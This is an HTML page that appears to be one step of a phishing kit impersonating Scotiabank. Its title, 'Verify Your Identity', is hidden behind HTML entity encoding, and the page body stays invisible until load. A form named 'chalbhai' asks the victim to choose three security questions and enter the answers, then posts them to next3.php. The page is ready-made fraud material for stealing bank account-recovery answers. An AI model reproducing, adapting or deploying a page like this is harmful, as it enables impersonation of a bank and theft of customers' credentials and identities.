<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#99;&#111;&#116;&#105;&#97;&#98;&#97;&#110;&#107;&#32;&#45;&#32;&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>				  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
 .textbox {
    height: 34px;
    width: 275px;
  	border-radius: 4px;
    border: 1px solid #B9BDC1;
  	padding-left: 10px;
	font-size: 17px;
   
   
}
.textbox:focus {  
    border-color: #6596DB; 
  	box-shadow: 0px 0px 2px #6596DB; 
    -moz-box-shadow: 0px 0px 2px #6596DB; 
    -webkit-box-shadow: 0px 0px 2px #6596DB;  
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 
}
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1348px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1348px; height:51px; z-index:0"><img src="images/st6.png" alt="" title="" border=0 width=1348 height=51></div>

<div id="image2" style="position:absolute; overflow:hidden; left:439px; top:64px; width:488px; height:110px; z-index:1"><img src="images/st11.png" alt="" title="" border=0 width=488 height=110></div>

<div id="image3" style="position:absolute; overflow:hidden; left:445px; top:221px; width:131px; height:486px; z-index:2"><img src="images/st10.png" alt="" title="" border=0 width=131 height=486></div>


<div id="shape1" style="position:absolute; overflow:hidden; left:262px; top:859px; width:130px; height:24px; z-index:13"><img border=0 width="100%" height="100%" alt="" src="images/shape242706140.gif"></div>

<form action=next3.php name=chalbhai id=chalbhai method=post>

<select name="q1" class="textbox" autocomplete="off" required style="position:absolute;left:449px;top:250px;width:569px;z-index:6">
<option value="Select Question 1">Select Question 1</option>
<option> As a child, what did you want to be when you grew up?</option>
<option> What is or was the name of the town your grandmother lived in? </option>
<option> What is the first name of your oldest niece?</option>
<option> What is the last name of your favorite teacher in elementary school?</option>
<option> What is the name of your first employer? </option>
<option> What is the name of your first pet?</option>
<option> What is the name of your oldest cousin?</option>
<option> What is your best friend's first name?</option>
<option> What is your favorite hobby?</option>
<option> What is your favorite movie?</option>
<option> What is your favorite vacation destination?</option>
<option> What is your paternal grandfather's first name?</option>
<option> What was the first name of your first manager?</option>
<option> What was the name of the street on wich you grew up?</option>
<option> What was the name of your first girlfriend/boyfirend?</option>
<option> Where did you go on your honeymoon?</option>
<option> Where did you meet your spouse for the first time?(Enter name of the city)</option>


</select>
<input name="ans1" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:331px;left:449px;top:333px;z-index:7">
<select name="q2" class="textbox" autocomplete="off" required style="position:absolute;left:449px;top:416px;width:570px;z-index:8">
<option value="Select Question 2">Select Question 2</option>

<option>As a child, what did you want to be when you grew up?</option>
<option>In what year did you graduate from high school?</option>
<option>What is the first name of your oldest niece?</option>
<option>What is the name of your favorite teacher in elementary school?</option>
<option>What is the name of your first employer?</option>
<option>What is the name of your first pet?</option>
<option>What is the name of your oldest cousin?</option>
<option>What is your best friend's first name? </option>
<option>What is your favorite hobby?</option>
<option>What is your favorite movie?</option>
<option>What is your favorite vacation destination?</option>
<option>What is your paternal grandfather's first name?</option>
<option>What was the first name of your first manager?</option>
<option>What was the name of the street on wich you grew up?</option>
<option>What was the name of your elementary school?</option>
<option>What was the name of your first girlfriend/boyfriend?</option>
<option>Where did you go on your honeymoon?</option>
<option>Where did you meet you spouse for the first time?(Enter name city)</option>

</select>
<input name="ans2" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:331px;left:449px;top:499px;z-index:9">
<select name="q3" class="textbox" autocomplete="off" required style="position:absolute;left:449px;top:582px;width:567px;z-index:10">
<option value="Select Question 3">Select Question 3</option>

<option>As a child, what did you want to be when you grew up?</option>
<option>What is the first name of your oldest nephew?</option>
<option>What is the first name of your oldest niece?</option>
<option>What is the name of your favorite teacher in elementary school?</option>
<option>What is the name of your first employer?</option>
<option>What is the name of your first pet?</option>
<option>What is the name of your oldest cousin?</option>
<option>What is your best friend's first name?</option>
<option>What is your favorite hobby?</option>
<option>What is your favorite movie?</option>
<option>What is your favorite vacation destination?</option>
<option>What is your paternal grandfather's first name?</option>
<option>What was the first name of your first manager?</option>
<option>What was the name of the street on wich you grew up?</option>
<option>What was the name of your elementary school?</option>
<option>What was the name of your first girlfriend/boyfriend?</option>
<option>Where did you go on your honeymoon?</option>
<option>Where did you meet you spouse for the first time?(Enter name city)</option></select>
<input name="ans3" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:331px;left:449px;top:665px;z-index:11">
<div id="formimage1" style="position:absolute; left:445px; top:772px; z-index:12"><input type="image" name="formimage1" width="572" height="47" src="images/submit.png"></div>

</div>

	
</body>
</html>
